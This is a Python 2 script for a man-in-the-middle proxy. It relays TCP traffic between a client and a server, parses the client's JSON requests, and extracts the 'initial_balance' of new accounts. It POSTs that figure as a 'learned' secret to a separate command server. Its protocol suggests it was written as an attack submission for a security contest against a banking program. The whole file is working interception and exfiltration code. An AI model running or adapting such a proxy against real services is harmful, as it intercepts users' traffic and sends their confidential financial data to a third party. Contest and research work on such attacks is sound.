#!/usr/bin/env python2

import socket
import argparse
import threading
import signal
import sys
import requests as req
import json 
from contextlib import contextmanager

running = True
verbose = True

CLIENT2SERVER = 1
SERVER2CLIENT = 2

def mitm(buff, direction, commandServerIP, commandServerPort):
    hb = buff
    if direction == CLIENT2SERVER:
        request = json.loads(hb)
        if(request['mode'] == 'new'):
            amount = float(request['initial_balance'])
            t1 = threading.Thread(target=sendAmountSignal, args=(float(amount), commandServerIP, commandServerPort))
            t1.start()
            #sendDoneSignal(commandServerIP, commandServerPort)
    elif direction == SERVER2CLIENT:
        pass
    return hb


@contextmanager
def ignored(*exceptions):
    try:
        yield
    except exceptions:
        pass


def killpn(a, b, n):
    if n != CLIENT2SERVER:
        killp(a, b)


def killp(a, b):
    with ignored(Exception):
        a.shutdown(socket.SHUT_RDWR)
        a.close()
        b.shutdown(socket.SHUT_RDWR)
        b.close()
    return


def worker(client, server, n, commandServerIP, commandServerPort):
    while running == True:
        b = ""
        with ignored(Exception):
            b = client.recv(1024)
        if len(b) == 0:
            killpn(client, server, n)
            return
        try:
            b = mitm(b, n, commandServerIP, commandServerPort)
        except:
            pass
        try:
            if b != None:
                server.send(b)
        except:
            killpn(client, server, n)
            return
    killp(client, server)
    return


def signalhandler(sn, sf):
    running = False


def getAmountLearnedCommand(amount):
    newAmount = amount/100
    formattedAmount = format(newAmount, '.2f')
    command = {"type": "learned","variable": "amount","secret": float(formattedAmount)}
    return json.dumps(command)


def getDoneCommand():
    command = {"type": "done"}
    return json.dumps(command)


def sendDoneSignal(command_server_ip,command_server_port):
    payload = {'REQUEST':getDoneCommand()}
    headers = {'Content-Type' : 'application/x-www-form-urlencoded','Accept':'*/*'}
    r = req.post("http://"+command_server_ip+":"+str(command_server_port)+"/sample/index.php", data = payload, headers = headers)
    print(r.text)


def sendAmountSignal(amount,command_server_ip,command_server_port):
    payload = {'REQUEST':getAmountLearnedCommand(amount)}
    headers = {'Content-Type' : 'application/x-www-form-urlencoded','Accept':'*/*'}
    r = req.post("http://"+command_server_ip+":"+str(command_server_port)+"/sample/index.php", data = payload, headers = headers)
    print(r.text)
    t1 = threading.Thread(target=sendDoneSignal, args=(command_server_ip, command_server_port))
    t1.start()
    

def doProxyMain(port, remotehost, remoteport, commandServerIP, commandServerPort):
    signal.signal(signal.SIGTERM, signalhandler)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)
        workers = []
        while running == True:
            k, a = s.accept()
            v = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            v.connect((remotehost, remoteport))
            t1 = threading.Thread(target=worker, args=(k, v, CLIENT2SERVER, commandServerIP, commandServerPort))
            t2 = threading.Thread(target=worker, args=(v, k, SERVER2CLIENT, commandServerIP, commandServerPort))
            t2.start()
            t1.start()
            workers.append((t1, t2, k, v))
    except KeyboardInterrupt:
        signalhandler(None, None)
    for t1, t2, k, v in workers:
        killp(k, v)
        t1.join()
        t2.join()
    return


def main():
    parser = argparse.ArgumentParser(description='Proxy')
    parser.add_argument('-p', type=int, default=4000, help="listen port")
    parser.add_argument('-s', type=str, default="127.0.0.1", help="server ip address")
    parser.add_argument('-q', type=int, default=3000, help="server port")
    parser.add_argument('-c', type=str, default="127.0.0.1", help="command server")
    parser.add_argument('-d', type=int, default=5000, help="command port")
    args = parser.parse_args()
    print('started\n')
    sys.stdout.flush()
    doProxyMain(args.p, args.s, args.q, args.c, args.d)

if __name__ == '__main__':
    main()
    
